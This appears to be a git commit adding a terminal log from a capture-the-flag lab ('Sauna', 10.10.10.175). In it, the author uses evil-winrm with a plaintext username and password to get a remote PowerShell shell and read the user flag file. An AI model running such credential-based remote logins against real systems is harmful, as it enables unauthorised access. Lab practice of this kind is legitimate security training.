c28be9b3b54d44aec7980911bbbd4c595cc4bbe0
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-16 16:15:34 -0400

    Create asFsmith.bash

---
+++ Sauna/asFsmith.bash
@@ -0,0 +1,23 @@
+allenwest1@debian:~$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> ls
+*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
+*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls
+
+
+    Directory: C:\Users\FSmith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/23/2020  10:03 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
+********************************
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> 
